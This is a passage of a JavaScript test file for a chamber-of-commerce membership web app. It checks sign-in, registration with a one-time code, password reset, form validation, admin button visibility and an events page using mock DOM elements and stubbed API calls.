  forgotStep1.appendChild(sendForgotOtpBtn);
  forgotForm.appendChild(forgotStep1);

  const forgotStep2 = new MockElement('div', 'applicantForgotStep2');
  forgotStep2.style.display = 'none';
  const forgotNotice = new MockElement('div', 'applicantForgotNoticeBanner');
  const forgotOtpIn = new MockElement('input', 'applicantForgotOtp');

  const newPassGroup = new MockElement('div', '', 'password-input-group');
  const newPassIn = new MockElement('input', 'applicantNewPassword');
  newPassIn.type = 'password';
  const newPassToggle = new MockElement('button', 'toggleApplicantNewPassword', 'password-toggle-btn');
  newPassToggle.setAttribute('aria-label', 'Toggle password visibility');
  const newPassIcon = new MockElement('i', '', 'fas fa-eye');
  newPassToggle.appendChild(newPassIcon);
  newPassGroup.appendChild(newPassIn);
  newPassGroup.appendChild(newPassToggle);

  const newConfGroup = new MockElement('div', '', 'password-input-group');
  const newConfIn = new MockElement('input', 'applicantNewPasswordConfirm');
  newConfIn.type = 'password';
  const newConfToggle = new MockElement('button', 'toggleApplicantNewPasswordConfirm', 'password-toggle-btn');
  newConfToggle.setAttribute('aria-label', 'Toggle password visibility');
  const newConfIcon = new MockElement('i', '', 'fas fa-eye');
  newConfToggle.appendChild(newConfIcon);
  newConfGroup.appendChild(newConfIn);
  newConfGroup.appendChild(newConfToggle);

  const resetBtn = new MockElement('button', 'applicantResetPasswordBtn', 'btn-primary');
  resetBtn.type = 'submit';

  forgotStep2.appendChild(forgotNotice);
  forgotStep2.appendChild(forgotOtpIn);
  forgotStep2.appendChild(newPassGroup);
  forgotStep2.appendChild(newConfGroup);
  forgotStep2.appendChild(resetBtn);
  forgotForm.appendChild(forgotStep2);

  const backToSignInFromForgot = new MockElement('button', 'switchToSignInFromForgot', 'auth-text-link');
  forgotForm.appendChild(backToSignInFromForgot);
  cardForgot.appendChild(forgotForm);

  gate.appendChild(cardSignIn);
  gate.appendChild(cardRegister);
  gate.appendChild(cardForgot);

  regEl(gate);
  regEl(banner);

  return {
    gate, banner, tabSignIn, tabRegister, tabsNav,
    cardSignIn, alertNotSet, legacySwitchBtn, signInForm, emailIn, passIn, passToggle, passIcon, forgotLink, signInBtn, regLink,
    cardRegister, regForm, regStep1, regEmailIn, regPassIn, regPassToggle, regPassIcon, regConfIn, regConfToggle, sendRegOtpBtn, regStep2, regOtpIn, resendRegOtpBtn, regBtn, regBackToStep1Btn, backToSignInFromReg,
    cardForgot, forgotForm, forgotStep1, forgotEmailIn, sendForgotOtpBtn, forgotStep2, forgotOtpIn, newPassIn, newPassToggle, newPassIcon, newConfIn, newConfToggle, resetBtn, backToSignInFromForgot
  };
}

const { App } = await import('../js/app.js');

ck('App prototype has showAuthMode method', typeof App?.prototype?.showAuthMode === 'function');
ck('App prototype has setupApplicantAuthHandlers method', typeof App?.prototype?.setupApplicantAuthHandlers === 'function');
ck('App prototype has callOtpApi method', typeof App?.prototype?.callOtpApi === 'function');

// Test callOtpApi error handling
{
  const realApp = Object.create(App.prototype);
  const oldFetch = globalThis.fetch;
  try {
    // 1. Test 502 server error with message
    globalThis.fetch = async () => ({
      ok: false,
      status: 502,
      json: async () => ({ error: 'Could not send verification email.' })
    });
    const res502 = await realApp.callOtpApi('/api/send-otp', { email: 'test@example.com' });
    ck('callOtpApi surfaces 502 server error message without throwing', res502.success === false && res502.error === 'Could not send verification email.');

    // 2. Test 404 endpoint not found
    globalThis.fetch = async () => ({
      ok: false,
      status: 404,
      json: async () => { throw new Error('Not JSON'); }
    });
    const res404 = await realApp.callOtpApi('/api/send-otp', { email: 'test@example.com' });
    ck('callOtpApi explains 404 when backend is unreachable', res404.success === false && res404.error.includes('Ensure backend server is running'));

    // 3. Test network TypeError rejection
    globalThis.fetch = async () => {
      throw new TypeError('Failed to fetch');
    };
    const resNet = await realApp.callOtpApi('/api/send-otp', { email: 'test@example.com' });
    ck('callOtpApi handles fetch TypeError gracefully', resNet.success === false && resNet.error.includes('Cannot reach API server'));
  } finally {
    globalThis.fetch = oldFetch;
  }
}

// Helper to create test App instance
function createTestApp(dom, testStore) {
  const app = Object.create(App.prototype);
  app.store = testStore;
  app.toasts = [];
  app.showToast = (msg, type) => { app.toasts.push({ msg, type }); };
  app.viewsRendered = [];
  app.renderView = async (v) => { app.viewsRendered.push(v); };
  app.navAuthUpdated = 0;
  app.updateNavAuthUI = () => { app.navAuthUpdated++; };
  app.applicantAuthUpdated = 0;
  app.updateApplicantAuthUI = async () => { app.applicantAuthUpdated++; };
  app.callOtpApi = async (endpoint, payload) => {
    return { success: true, message: 'Code sent successfully.' };
  };
  app.announce = () => {};
  return app;
}

// Mode switching & email propagation tests
{
  const dom = buildAuthDOM();
  const testApp = createTestApp(dom, store);

  if (typeof testApp.showAuthMode === 'function') {
    dom.emailIn.value = 'user@example.com';
    testApp.showAuthMode('register');
    ck('showAuthMode("register") shows register card, hides others',
      dom.cardSignIn.style.display === 'none' &&
      dom.cardRegister.style.display === 'block' &&
      dom.cardForgot.style.display === 'none'
    );
    ck('showAuthMode("register") propagates email to register form', dom.regEmailIn.value === 'user@example.com');

    dom.regEmailIn.value = 'updated@example.com';
    testApp.showAuthMode('forgot');
    ck('showAuthMode("forgot") shows forgot card, hides others',
      dom.cardSignIn.style.display === 'none' &&
      dom.cardRegister.style.display === 'none' &&
      dom.cardForgot.style.display === 'block'
    );
    ck('showAuthMode("forgot") propagates email to forgot form', dom.forgotEmailIn.value === 'updated@example.com');

    dom.alertNotSet.style.display = 'block';
    dom.regStep2.style.display = 'block';
    dom.forgotStep2.style.display = 'block';
    testApp.showAuthMode('signin');
    ck('showAuthMode("signin") shows signin card',
      dom.cardSignIn.style.display === 'block' &&
      dom.cardRegister.style.display === 'none' &&
      dom.cardForgot.style.display === 'none'
    );
    ck('showAuthMode resets error alert and step 2 displays',
      dom.alertNotSet.style.display === 'none' &&
      dom.regStep2.style.display === 'none' &&
      dom.forgotStep2.style.display === 'none'
    );
    ck('showAuthMode("signin") marks tabAuthSignIn active', dom.tabSignIn.classList.contains('active') && !dom.tabRegister.classList.contains('active'));
    testApp.showAuthMode('register');
    ck('showAuthMode("register") marks tabAuthRegister active', dom.tabRegister.classList.contains('active') && !dom.tabSignIn.classList.contains('active'));
    testApp.showAuthMode('forgot');
    ck('showAuthMode("forgot") hides authModeTabs', dom.tabsNav.style.display === 'none');
    testApp.showAuthMode('signin');
    ck('showAuthMode("signin") restores authModeTabs', dom.tabsNav.style.display !== 'none');
  } else {
    ck('showAuthMode("register") shows register card, hides others', false, 'showAuthMode not implemented');
    ck('showAuthMode("register") propagates email to register form', false, 'showAuthMode not implemented');
    ck('showAuthMode("forgot") shows forgot card, hides others', false, 'showAuthMode not implemented');
    ck('showAuthMode("forgot") propagates email to forgot form', false, 'showAuthMode not implemented');
    ck('showAuthMode("signin") shows signin card', false, 'showAuthMode not implemented');
    ck('showAuthMode resets error alert and step 2 displays', false, 'showAuthMode not implemented');
  }
}

// Password toggle test
{
  const dom = buildAuthDOM();
  const testApp = createTestApp(dom, store);
  if (typeof testApp.setupApplicantAuthHandlers === 'function') {
    testApp.setupApplicantAuthHandlers();

    // Click toggle once -> text
    dom.passToggle.click();
    ck('clicking password toggle changes type to text', dom.passIn.type === 'text');
    ck('clicking password toggle changes aria-label to Hide password', dom.passToggle.getAttribute('aria-label') === 'Hide password');
    ck('clicking password toggle updates icon to fa-eye-slash', dom.passIcon.classList.contains('fa-eye-slash'));

    // Click toggle again -> password
    dom.passToggle.click();
    ck('clicking password toggle second time changes type back to password', dom.passIn.type === 'password');
    ck('clicking password toggle changes aria-label to Show password', dom.passToggle.getAttribute('aria-label') === 'Show password');
    ck('clicking password toggle updates icon back to fa-eye', dom.passIcon.classList.contains('fa-eye'));
  } else {
    ck('clicking password toggle changes type to text', false, 'setupApplicantAuthHandlers not implemented');
    ck('clicking password toggle changes aria-label to Hide password', false, 'setupApplicantAuthHandlers not implemented');
    ck('clicking password toggle updates icon to fa-eye-slash', false, 'setupApplicantAuthHandlers not implemented');
    ck('clicking password toggle second time changes type back to password', false, 'setupApplicantAuthHandlers not implemented');
    ck('clicking password toggle changes aria-label to Show password', false, 'setupApplicantAuthHandlers not implemented');
    ck('clicking password toggle updates icon back to fa-eye', false, 'setupApplicantAuthHandlers not implemented');
  }
}

// Sign In with PASSWORD_NOT_SET banner test
{
  const dom = buildAuthDOM();
  const mockStore = {
    ...store,
    applicantLogin: async () => ({
      success: false,
      code: 'PASSWORD_NOT_SET',
      error: 'No password set for this account yet.',
    }),
    getApplicantSession: () => null,
  };
  const testApp = createTestApp(dom, mockStore);
  if (typeof testApp.setupApplicantAuthHandlers === 'function') {
    testApp.setupApplicantAuthHandlers();
    dom.emailIn.value = 'legacy@example.com';
    dom.passIn.value = 'SomePass123';
    await dom.signInForm.submit();
    ck('Sign in with PASSWORD_NOT_SET displays #passwordNotSetAlert banner', dom.alertNotSet.style.display !== 'none');

    // Clicking legacySwitchToRegister inside banner switches to register
    dom.legacySwitchBtn.click();
    ck('legacySwitchToRegister switches to register mode', dom.cardRegister.style.display === 'block');
    ck('legacySwitchToRegister carries email over', dom.regEmailIn.value === 'legacy@example.com');
  } else {
    ck('Sign in with PASSWORD_NOT_SET displays #passwordNotSetAlert banner', false);
    ck('legacySwitchToRegister switches to register mode', false);
    ck('legacySwitchToRegister carries email over', false);
  }
}

// Sign In success test
{
  const dom = buildAuthDOM();
  const mockStore = {
    ...store,
    applicantLogin: async () => ({
      success: true,
      session: { email: 'valid@example.com', token: 'tok-123' },
    }),
    getApplicationByEmail: async () => null,
    getApplicantSession: () => ({ email: 'valid@example.com', token: 'tok-123' }),
  };
  const testApp = createTestApp(dom, mockStore);
  if (typeof testApp.setupApplicantAuthHandlers === 'function') {
    testApp.setupApplicantAuthHandlers();
    dom.emailIn.value = 'valid@example.com';
    dom.passIn.value = 'ValidPass123';
    await dom.signInForm.submit();
    ck('Sign in success calls updateNavAuthUI', testApp.navAuthUpdated >= 1);
    ck('Sign in success transitions to membership view', testApp.viewsRendered.includes('membership'));
    ck('Sign in success shows success toast', testApp.toasts.some(t => t.type === 'success'));

    // Tab button click interaction test
    dom.tabRegister.click();
    ck('clicking tabAuthRegister switches to register mode', dom.cardRegister.style.display === 'block');
    dom.tabSignIn.click();
    ck('clicking tabAuthSignIn switches back to signin mode', dom.cardSignIn.style.display === 'block');
  } else {
    ck('Sign in success calls updateNavAuthUI', false);
    ck('Sign in success transitions to membership view', false);
    ck('Sign in success shows success toast', false);
  }
}

// Registration handling test
{
  const dom = buildAuthDOM();
  let regPayload = null;
  const mockStore = {
    ...store,
    applicantRegister: async (email, code, password) => {
      regPayload = { email, code, password };
      return { success: true, session: { email, token: 'reg-tok-456' } };
    },
    getApplicationByEmail: async () => null,
    getApplicantSession: () => ({ email: 'new@example.com', token: 'reg-tok-456' }),
  };
  const testApp = createTestApp(dom, mockStore);
  if (typeof testApp.setupApplicantAuthHandlers === 'function') {
    testApp.setupApplicantAuthHandlers();

    // Step 1: Validation before OTP is sent (mismatched passwords)
    dom.regEmailIn.value = 'new@example.com';
    dom.regPassIn.value = 'Password123';
    dom.regConfIn.value = 'MismatchPass';
    testApp.toasts = [];
    await dom.sendRegOtpBtn.click();
    ck('Step 1 rejects mismatched passwords before sending OTP', dom.regStep2.style.display === 'none' && testApp.toasts.some(t => t.type === 'warning' || t.type === 'error'));

    // Step 1: Validation before OTP is sent (short password < 8)
    dom.regPassIn.value = 'short';
    dom.regConfIn.value = 'short';
    testApp.toasts = [];
    await dom.sendRegOtpBtn.click();
    ck('Step 1 rejects short passwords (< 8 chars) before sending OTP', dom.regStep2.style.display === 'none' && testApp.toasts.some(t => t.type === 'warning' || t.type === 'error'));

    // Step 1: Valid credentials -> Send OTP successfully
    dom.regPassIn.value = 'ValidPass123';
    dom.regConfIn.value = 'ValidPass123';
    testApp.toasts = [];
    await dom.sendRegOtpBtn.click();
    ck('applicantSendRegOtpBtn hides step 1 and shows step 2 on valid credentials', dom.regStep1.style.display === 'none' && dom.regStep2.style.display === 'block');

    // Step 2: Back to Step 1 button
    if (dom.regBackToStep1Btn) {
      await dom.regBackToStep1Btn.click();
      ck('applicantRegBackToStep1Btn returns to step 1', dom.regStep1.style.display === 'block' && dom.regStep2.style.display === 'none');
      // Return to step 2 for subsequent tests
      await dom.sendRegOtpBtn.click();
    }

    // Step 2: Resend OTP
    if (dom.resendRegOtpBtn) {
      testApp.toasts = [];
      await dom.resendRegOtpBtn.click();
      ck('applicantResendRegOtpBtn requests new code', testApp.toasts.some(t => t.type === 'success'));
    }

    // Step 2: Validation of OTP code length === 6
    dom.regOtpIn.value = '123';
    testApp.toasts = [];
    await dom.regForm.submit();
    ck('Registration rejects incomplete OTP (< 6 digits)', regPayload === null && testApp.toasts.some(t => t.type === 'warning' || t.type === 'error'));

    // Step 2: Successful registration
    dom.regOtpIn.value = '123456';
    await dom.regForm.submit();
    ck('Registration submits to applicantRegister with valid inputs', regPayload?.email === 'new@example.com' && regPayload?.code === '123456' && regPayload?.password === 'ValidPass123');
    ck('Registration success updates nav auth UI and transitions to membership', testApp.navAuthUpdated >= 1 && testApp.viewsRendered.includes('membership'));
  } else {
    ck('Step 1 rejects mismatched passwords before sending OTP', false);
    ck('Step 1 rejects short passwords (< 8 chars) before sending OTP', false);
    ck('applicantSendRegOtpBtn hides step 1 and shows step 2 on valid credentials', false);
    ck('Registration rejects incomplete OTP (< 6 digits)', false);
    ck('Registration submits to applicantRegister with valid inputs', false);
    ck('Registration success updates nav auth UI and transitions to membership', false);
  }
}

// Forgot password handling test
{
  const dom = buildAuthDOM();
  let forgotRequestEmail = null;
  let resetPayload = null;
  const mockStore = {
    ...store,
    applicantForgotPasswordRequest: async (email) => {
      forgotRequestEmail = email;
      return { success: true, message: 'Reset code sent.' };
    },
    applicantResetPassword: async (email, code, newPassword) => {
      resetPayload = { email, code, newPassword };
      return { success: true, session: { email, token: 'reset-tok-789' } };
    },
    getApplicationByEmail: async () => null,
    getApplicantSession: () => ({ email: 'reset@example.com', token: 'reset-tok-789' }),
  };
  const testApp = createTestApp(dom, mockStore);
  if (typeof testApp.setupApplicantAuthHandlers === 'function') {
    testApp.setupApplicantAuthHandlers();

    // Step 1: Send Forgot OTP
    dom.forgotEmailIn.value = 'reset@example.com';
    await dom.sendForgotOtpBtn.click();
    ck('applicantSendForgotOtpBtn calls applicantForgotPasswordRequest', forgotRequestEmail === 'reset@example.com');
    ck('applicantSendForgotOtpBtn shows applicantForgotStep2', dom.forgotStep2.style.display === 'block');

    // Step 2: Reset password validation
    dom.forgotOtpIn.value = '654321';
    dom.newPassIn.value = 'NewPassword123';
    dom.newConfIn.value = 'WrongConfirm';
    testApp.toasts = [];
    await dom.forgotForm.submit();
    ck('Reset password rejects mismatched passwords', resetPayload === null && testApp.toasts.some(t => t.type === 'warning' || t.type === 'error'));

    // Step 2: Successful reset
    dom.newConfIn.value = 'NewPassword123';
    await dom.forgotForm.submit();
    ck('Reset password submits to applicantResetPassword with valid inputs', resetPayload?.email === 'reset@example.com' && resetPayload?.code === '654321' && resetPayload?.newPassword === 'NewPassword123');
    ck('Reset password success updates nav auth UI and transitions view', testApp.navAuthUpdated >= 1 && testApp.viewsRendered.includes('membership'));
  } else {
    ck('applicantSendForgotOtpBtn calls applicantForgotPasswordRequest', false);
    ck('applicantSendForgotOtpBtn shows applicantForgotStep2', false);
    ck('Reset password rejects mismatched passwords', false);
    ck('Reset password submits to applicantResetPassword with valid inputs', false);
    ck('Reset password success updates nav auth UI and transitions view', false);
  }
}

// ════════════════════════════════════════════════════════════════════
// Admin Page Apply Button Removal & Membership Form Field Validation
// ════════════════════════════════════════════════════════════════════
console.log('\nAdmin Page Apply Button Removal & Membership Form Validation');
console.log('────────────────────────────────────────────────────────────');

ck('admin view hides Apply for Membership CTA buttons in code', SRC.includes("this.adminAuthed || this.currentView === 'admin'") && SRC.includes("el.style.display = 'none'"));
ck('admin view hides mobile membership tab in code', SRC.includes("this.adminAuthed || this.currentView === 'admin'") && SRC.includes("tab.style.display = 'none'"));
ck('membership form validates annualTurnover', SRC.includes("case 'annualTurnover':"));
ck('membership form validates employees headcount', SRC.includes("case 'employees':"));
ck('membership form validates address min length', SRC.includes("case 'address':") && SRC.includes("val.length < 5"));
ck('paymentProof has required attribute in index.html', /<input[^>]*name=["']paymentProof["'][^>]*required/.test(HTML));
ck('annualTurnover has required attribute in index.html', /<input[^>]*name=["']annualTurnover["'][^>]*required/.test(HTML));
ck('employees headcount has required attribute in index.html', /<input[^>]*name=["']employees["'][^>]*required/.test(HTML));

// Functional tests for field validations
{
  const app = Object.create(App.prototype);
  app.currentPaymentProofBase64 = null;

  const createInput = (name, val, required = true) => {
    const parent = new MockElement('div', '', 'form-group');
    const inp = new MockElement('input');
    inp.name = name;
    inp.value = val;
    if (required) inp.setAttribute('required', '');
    parent.appendChild(inp);
    inp.parentElement = parent;
    return inp;
  };

  // annualTurnover
  const turnEmpty = createInput('annualTurnover', '');
  ck('annualTurnover rejects empty value', !app.validateField(turnEmpty));
  const turnShort = createInput('annualTurnover', 'A');
  ck('annualTurnover rejects < 2 chars', !app.validateField(turnShort));
  const turnValid = createInput('annualTurnover', '25 Crore');
  ck('annualTurnover accepts valid value', app.validateField(turnValid));

  // employees
  const empZero = createInput('employees', '0');
  ck('employees rejects 0', !app.validateField(empZero));
  const empNeg = createInput('employees', '-5');
  ck('employees rejects negative numbers', !app.validateField(empNeg));
  const empNan = createInput('employees', 'abc');
  ck('employees rejects NaN string', !app.validateField(empNan));
  const empValid = createInput('employees', '150');
  ck('employees accepts valid headcount', app.validateField(empValid));

  // address
  const addrShort = createInput('address', 'Abc');
  ck('address rejects < 5 chars', !app.validateField(addrShort));
  const addrValid = createInput('address', 'Plot 42, GIDC Industrial Estate, Bharuch');
  ck('address accepts valid address', app.validateField(addrValid));

  // paymentProof
  const proofDropzone = new MockElement('div', 'paymentProofDropzone');
  regEl(proofDropzone);
  const proofInput = createInput('paymentProof', '', true);
  ck('paymentProof rejects when no receipt uploaded', !app.validateField(proofInput));
  app.currentPaymentProofBase64 = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
  ck('paymentProof accepts when receipt is uploaded', app.validateField(proofInput));

  // CTA visibility functional test
  const ctaBtn1 = new MockElement('button');
  ctaBtn1.setAttribute('data-apply-cta', '');
  const ctaBtn2 = new MockElement('button');
  ctaBtn2.setAttribute('data-apply-cta', '');
  const mobTab = new MockElement('a', 'mobileTabMembership');
  regEl(mobTab);
  globalDocElements.set('cta1', ctaBtn1);
  globalDocElements.set('cta2', ctaBtn2);

  app.adminAuthed = true;
  app._updateApplyCtas(null);
  ck('when adminAuthed is true, apply CTAs are hidden', ctaBtn1.style.display === 'none' && ctaBtn2.style.display === 'none');
  app._updateMobileMembershipTab(null);
  ck('when adminAuthed is true, mobile tab is hidden', mobTab.style.display === 'none');

  app.adminAuthed = false;
  app.currentView = 'home';
  app._updateApplyCtas(null);
  ck('when adminAuthed is false on home, apply CTAs are visible', ctaBtn1.style.display === '' && ctaBtn2.style.display === '');
  app._updateMobileMembershipTab(null);
  ck('when adminAuthed is false on home, mobile tab is visible', mobTab.style.display === '');

  // Subject validation
  const subjShort = createInput('subject', 'A');
  ck('subject rejects < 2 chars', !app.validateField(subjShort));
  const subjValid = createInput('subject', 'Membership Enquiry');
  ck('subject accepts valid subject', app.validateField(subjValid));

  // Verify index.html structural integrity
  const htmlContent = fs.readFileSync(new URL('../index.html', import.meta.url), 'utf8');
  ck('view-membership has container inside section-padding', htmlContent.includes('<main id="view-membership" class="view-page" style="display: none;">\n    <section class="section-padding">\n      <div class="container">'));
  ck('index.html has no duplicate downloadCardBtn', (htmlContent.match(/id="downloadCardBtn"/g) || []).length === 0);
  ck('index.html has no duplicate printCardBtn', (htmlContent.match(/id="printCardBtn"/g) || []).length === 0);

  // Verify renewal error toast shows err.message
  ck('showRenewalModal uses err?.message for error toasts', SRC.includes("this.showToast(err?.message || 'Failed to renew membership. Please try again.', 'error')"));

  // Verify password-input-group padding in CSS
  const cssContent = fs.readFileSync(new URL('../css/styles.css', import.meta.url), 'utf8');
  ck('password-input-group form-control has right padding in CSS', cssContent.includes('.password-input-group .form-control') && cssContent.includes('padding-right: 2.5rem;'));

  // Admin Event Broadcasting assertions
  ck('admin portal has Event Broadcasting tab', htmlContent.includes('data-tab="events"'));
  ck('#tab-events exists in index.html', htmlContent.includes('id="tab-events"'));
  ck('#broadcastEventForm exists in index.html', htmlContent.includes('id="broadcastEventForm"'));
  ck('#eventTitleInput exists in index.html', htmlContent.includes('id="eventTitleInput"'));
  ck('#eventCapacityInput exists in index.html', htmlContent.includes('id="eventCapacityInput"'));
  ck('#eventModeSelect exists in index.html', htmlContent.includes('id="eventModeSelect"'));
  ck('#eventPricingSelect exists in index.html', htmlContent.includes('id="eventPricingSelect"'));
  ck('App prototype has renderAdminEvents', typeof App.prototype.renderAdminEvents === 'function');

  // Public Events Page assertions
  ck('VIEW_PATHS has events route', SRC.includes("events: '/events'"));
  ck('PAGE_TITLES has events title', SRC.includes("events: 'Events & Conclaves — BCCI Bharuch'"));
  ck('data-view-nav="events" exists in desktop nav', htmlContent.includes('<li class="nav-item"><a href="#" class="nav-link" data-view-nav="events">Events</a></li>'));
  ck('data-view-nav="events" exists in mobile drawer', htmlContent.includes('data-view-nav="events"><i class="fas fa-calendar-alt"></i> Events &amp; Conclaves</a>'));
  ck('data-view-nav="events" exists in footer', htmlContent.includes('data-view-nav="events">Events &amp; Conclaves</a>'));
  ck('#view-events exists in index.html', htmlContent.includes('id="view-events"'));
  ck('#eventsGrid exists in index.html', htmlContent.includes('id="eventsGrid"'));
  ck('#eventsFilterPills exists in index.html', htmlContent.includes('id="eventsFilterPills"'));
  ck('#eventsSearchInput exists in index.html', htmlContent.includes('id="eventsSearchInput"'));
  ck('App prototype has renderEventsPage', typeof App.prototype.renderEventsPage === 'function');
  ck('App prototype has showJoinEventModal', typeof App.prototype.showJoinEventModal === 'function');

  // ── Public Events & Join Modal Test Suite ──────────────────────────
  console.log('\nPublic Events & Registration Modal');
  console.log('─────────────────────────────────');

  const eventsGrid = new MockElement('div', 'eventsGrid');
  const eventsEmptyState = new MockElement('div', 'eventsEmptyState');
  eventsEmptyState.style.display = 'none';
  const eventsFilterPills = new MockElement('div', 'eventsFilterPills');
  const eventsSearchInput = new MockElement('input', 'eventsSearchInput');
  const modalBackdrop = new MockElement('div', 'modalBackdrop');
  const modalContainer = new MockElement('div', 'modalContainer');

  regEl(eventsGrid);
  regEl(eventsEmptyState);
  regEl(eventsFilterPills);
  regEl(eventsSearchInput);
  regEl(modalBackdrop);
  regEl(modalContainer);

  const sampleEvents = [
    {
      id: 'ev-1',
      title: 'BCCI Industrial Conclave 2026',
      date: '2026-10-15',
      time: '10:00 AM - 04:00 PM',
      mode: 'offline',
      venue: 'BCCI Hall, Station Road, Bharuch',
      pricingType: 'free',
      fee: 0,
      capacity: 100,
      registeredCount: 50,
      seatsLeft: 50,
      isFull: false,
      description: 'Annual flagship conclave for Gujarat chemical industry leaders.',
    },
    {
      id: 'ev-2',
      title: 'Webinar on GST Compliance',
      date: '2026-11-01',
      time: '03:00 PM - 05:00 PM',
      mode: 'online',
      venue: 'https://meet.google.com/abc-def-ghi',
      pricingType: 'paid',
      fee: 499,
      capacity: 50,
      registeredCount: 50,
      seatsLeft: 0,
      isFull: true,
      description: 'Interactive session on new GST compliance norms.',
    }
  ];
  app.store = {
    getEvents: async () => sampleEvents,
    registerForEvent: async () => ({ success: true, message: 'Registration confirmed!' }),
  };
  app.announce = () => {};
  app.showToast = () => {};
  await app.renderEventsPage();

  ck('renderEventsPage populates eventsGrid HTML', eventsGrid.innerHTML.includes('BCCI Industrial Conclave 2026'));
  ck('event card contains offline mode badge', eventsGrid.innerHTML.includes('In-Person Venue'));
  ck('event card contains online mode badge', eventsGrid.innerHTML.includes('Virtual Online'));
  ck('event card displays capacity progress', eventsGrid.innerHTML.includes('50 / 100 Joined'));
  ck('full event renders Sold Out / Capacity Full button', eventsGrid.innerHTML.includes('Sold Out / Capacity Full'));
  ck('open event renders Register / Join Event button', eventsGrid.innerHTML.includes('data-join-event-id="ev-1"'));

  // Test filter pills
  app._eventsFilter = 'online';
  app.applyEventsFilterAndSearch();
  ck('filtering by online keeps only online event', eventsGrid.innerHTML.includes('Webinar on GST Compliance') && !eventsGrid.innerHTML.includes('BCCI Industrial Conclave 2026'));

  app._eventsFilter = 'free';
  app.applyEventsFilterAndSearch();
  ck('filtering by free keeps only free event', eventsGrid.innerHTML.includes('BCCI Industrial Conclave 2026') && !eventsGrid.innerHTML.includes('Webinar on GST Compliance'));

  // Test search query
  app._eventsFilter = 'all';
  app._eventsSearchQuery = 'conclave';
  app.applyEventsFilterAndSearch();
  ck('searching for conclave shows matching event', eventsGrid.innerHTML.includes('BCCI Industrial Conclave 2026') && !eventsGrid.innerHTML.includes('Webinar on GST Compliance'));

  app._eventsSearchQuery = 'nonexistentxyz';
  app.applyEventsFilterAndSearch();
  ck('search with no match displays empty state', eventsEmptyState.style.display === 'block');

  // Test showJoinEventModal
  app._eventsSearchQuery = '';
  app._eventsFilter = 'all';
  app.showJoinEventModal(sampleEvents[0]);
  ck('showJoinEventModal opens modal container', modalBackdrop.classList.contains('show'));
  ck('modal container contains attendee registration form', modalContainer.innerHTML.includes('id="joinEventForm"'));
  ck('modal container contains delegate inputs', modalContainer.innerHTML.includes('id="joinNameInput"') && modalContainer.innerHTML.includes('id="joinPhoneInput"'));
}

console.log(`\n${'═'.repeat(52)}\n  ${pass} passed, ${fail} failed\n${'═'.repeat(52)}`);
process.exit(fail?1:0);

